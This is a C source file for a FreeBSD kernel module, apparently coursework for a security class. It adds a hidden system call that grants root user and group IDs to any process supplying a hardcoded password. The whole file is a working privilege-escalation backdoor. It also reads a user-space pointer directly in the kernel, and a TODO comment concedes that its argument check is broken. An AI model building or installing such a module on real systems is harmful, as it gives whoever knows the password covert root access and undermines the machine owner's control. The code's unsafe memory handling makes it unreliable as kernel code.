#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/errno.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/syscallsubr.h>
#include <sys/ucred.h>
#include <sys/signal.h>
#include <sys/types.h>
#include <sys/signalvar.h>

#define PRIV_ESC_PASSWD "6447_priv_esc_passwd"

/* The system call's arguments. */
struct sc_args {
	char *passwd;
};

/* The system call function. */
static int
priv_esc(struct thread *td, void *syscall_args) {
    struct sc_args * args = (struct sc_args *) syscall_args;

    if (syscall_args == NULL || strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
        // TODO still need to defend against 0 args passed in. syscll_args == NULL check doesn't work
        uprintf("[*] module: incorrect password provided\n");
        tdsignal(td, SIGSYS);
        return ENOSYS;
    }

    td->td_ucred->cr_uid = td->td_ucred->cr_ruid = td->td_ucred->cr_svuid = 0u;
    td->td_ucred->cr_gid = td->td_ucred->cr_rgid = td->td_ucred->cr_svgid = 0u;

    uprintf("[*] module: correct password provided\n");
    uprintf("[*] module: this process now has uid and gid of root\n");

	return 0;
}

/* The sysent for the new system call. */
static struct sysent priv_esc_sysent = {
	1,              /* number of arguments */
	priv_esc        /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg) {
    return 0;
}

SYSCALL_MODULE(priv_esc, &offset, &priv_esc_sysent, load, NULL);
